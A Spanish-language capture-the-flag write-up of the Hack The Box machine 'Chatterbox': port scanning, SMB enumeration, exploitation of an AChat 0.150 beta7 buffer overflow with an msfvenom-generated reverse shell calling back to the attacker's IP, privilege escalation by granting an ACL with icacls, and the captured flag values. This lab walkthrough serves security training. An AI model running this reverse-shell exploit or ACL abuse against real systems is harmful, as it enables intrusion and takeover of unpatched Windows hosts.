---
layout: post
title: ChatterBox
date: 2023-02-28
description:
img:
fig-caption:
tags: [OSCP]
---
___

<center><img src="/writeups/assets/img/Chatterbox-htb/Chatterbox.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de Achat 0.150 beta7

* Análisis de ACLs (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.74 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 09:17 GMT
Nmap scan report for 10.10.10.74
Host is up (1.5s latency).
Not shown: 59517 closed tcp ports (reset), 6007 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 10.10.10.74 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 09:18 GMT
Nmap scan report for 10.10.10.74
Host is up (0.26s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h39m59s, deviation: 2h53m14s, median: 4h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-28T14:19:31
|_  start_date: 2023-02-28T14:15:30
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-28T09:19:30-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.45 seconds
```

## Puerto 135 (RPC)

No tengo acceso con un null session

```null
rpcclient -U "" 10.10.10.74 -N
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

## Puerto 445 (SMB)

Con crackmapexec aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.74
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
```

Añado el dominio al ```/etc/hosts```. No puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.74 -u 'null'
[!] Authentication error on 10.10.10.74
```

Tampoco es vulnerable al ```etenalblue```

```null
python2 checker.py 10.10.10.74
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is patched
```

## Puerto 9955 (Achat)

Existen varios exploits públicos para determinadas versiones

```null
searchsploit achat
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                                                                    | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                                                                       | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                          | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                                                                            | php/webapps/24647.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```null
searchsploit -m windows/remote/36025.py
mv 36025.py exploit.py
```

Creo un nuevo shellcode con ```msfvenom```

```null
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Pongo la IP de lá máquina en el script y gano acceso en una sesión de ```netcat``` y puedo ver la primera flag

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Users\Alfred\Desktop>type user.txt
type user.txt
0802babac1235d7a7f9dfa03760bb88e
```

# Escalada

El usuario actual tiene privilegios full sobre el escritorio del Administrador

```null
C:\Users\Administrator>icacls Desktop
icacls Desktop
Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

Le asigno un ACL a la flag para poder verla

```null
C:\Users\Administrator\Desktop>icacls root.txt /grant Alfred:F
icacls root.txt /grant Alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```

```null
C:\Users\Administrator\Desktop>type root.txt
type root.txt
37d960f21ba0635133c4248b5cfb7bee
```